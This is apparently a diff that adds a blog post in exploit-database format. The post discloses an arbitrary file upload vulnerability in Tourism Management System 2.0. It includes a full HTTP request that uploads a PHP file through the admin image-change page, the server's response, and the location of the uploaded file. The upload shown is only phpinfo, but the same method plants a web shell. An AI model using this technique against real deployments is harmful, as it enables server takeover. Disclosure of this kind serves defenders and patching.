@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Tourism Management System 2.0 Shell Upload</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Tourism Management System 2.0 Shell Upload | Hacker-Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Tourism Management System 2.0 Shell Upload" />
+<meta name="author" content="SoSPiro" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Exploit Title: Tourism Management System v2.0 - Arbitrary File Upload Google Dork: N/A Exploit Author: SoSPiro Date: 2024-02-18 Vendor Homepage: https://phpgurukul.com Software Link: https://phpgurukul.com/tourism-management-system-free-download/ Version: 2.0 Tested on: Windows 10 Pro Impact: Allows admin to upload all files to the web server CVE : N/A" />
+<meta property="og:description" content="Exploit Title: Tourism Management System v2.0 - Arbitrary File Upload Google Dork: N/A Exploit Author: SoSPiro Date: 2024-02-18 Vendor Homepage: https://phpgurukul.com Software Link: https://phpgurukul.com/tourism-management-system-free-download/ Version: 2.0 Tested on: Windows 10 Pro Impact: Allows admin to upload all files to the web server CVE : N/A" />
+<link rel="canonical" href="http://localhost:8000/Tourism-Management-System-2.0-Shell-Upload" />
+<meta property="og:url" content="http://localhost:8000/Tourism-Management-System-2.0-Shell-Upload" />
+<meta property="og:site_name" content="Hacker-Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-02-18T00:00:00+04:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Tourism Management System 2.0 Shell Upload" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"SoSPiro","url":"http://0.0.0.0:8000/hacker-blog-master"},"dateModified":"2024-02-18T00:00:00+04:00","datePublished":"2024-02-18T00:00:00+04:00","description":"Exploit Title: Tourism Management System v2.0 - Arbitrary File Upload Google Dork: N/A Exploit Author: SoSPiro Date: 2024-02-18 Vendor Homepage: https://phpgurukul.com Software Link: https://phpgurukul.com/tourism-management-system-free-download/ Version: 2.0 Tested on: Windows 10 Pro Impact: Allows admin to upload all files to the web server CVE : N/A","headline":"Tourism Management System 2.0 Shell Upload","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Tourism-Management-System-2.0-Shell-Upload"},"url":"http://localhost:8000/Tourism-Management-System-2.0-Shell-Upload"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>sospiro@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Tourism Management System 2.0 Shell Upload</h2>
+  <time datetime="2024-02-18T00:00:00+04:00" class="by-line">18 Feb 2024</time>
+  <ul>
+  <li>Exploit Title: Tourism Management System v2.0 - Arbitrary File Upload</li>
+  <li>Google Dork: N/A</li>
+  <li>Exploit Author: SoSPiro</li>
+  <li>Date: 2024-02-18</li>
+  <li>Vendor Homepage: https://phpgurukul.com</li>
+  <li>Software Link: https://phpgurukul.com/tourism-management-system-free-download/</li>
+  <li>Version: 2.0</li>
+  <li>Tested on: Windows 10 Pro</li>
+  <li>Impact: Allows admin to upload all files to the web server</li>
+  <li>CVE : N/A</li>
+</ul>
+
+<hr />
+
+<h3 id="exploit-description">Exploit Description:</h3>
+<p>The application is prone to an arbitrary file-upload because it fails to adequately sanitize user-supplied input.</p>
+
+<h3 id="proof-of-concept-poc">Proof of Concept (PoC):</h3>
+
+<ul>
+  <li>Request</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /zer/tms/admin/change-image.php?imgid=1 HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------390927495111779706051786831201
+Content-Length: 361
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/zer/tms/admin/change-image.php?imgid=1
+Cookie: PHPSESSID=eqms3ipedmm41hqa1djnu1euhv
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+X-PwnFox-Color: red
+
+-----------------------------390927495111779706051786831201
+Content-Disposition: form-data; name="packageimage"; filename="phpinfo.php"
+Content-Type: text/plain
+
+&lt;?php phpinfo();?&gt;
+-----------------------------390927495111779706051786831201
+Content-Disposition: form-data; name="submit"
+
+
+-----------------------------390927495111779706051786831201--
+</code></pre></div></div>
+
+<hr />
+
+<ul>
+  <li>Response</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+Date: Sun, 18 Feb 2024 04:33:37 GMT
+Server: Apache/2.4.54 (Win64) PHP/8.1.13 mod_fcgid/2.3.10-dev
+X-Powered-By: PHP/8.1.13
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Content-Length: 8146
+</code></pre></div></div>
+<hr />
+
+<ul>
+  <li>File location: <code class="language-plaintext highlighter-rouge">http://localhost/zer/tms/admin/pacakgeimages/phpinfo.php</code></li>
+</ul>
+
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="#">
+    <span>
+        <b>SoSPiro</b>
+    </span>
+    
+    <span>© 2024</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
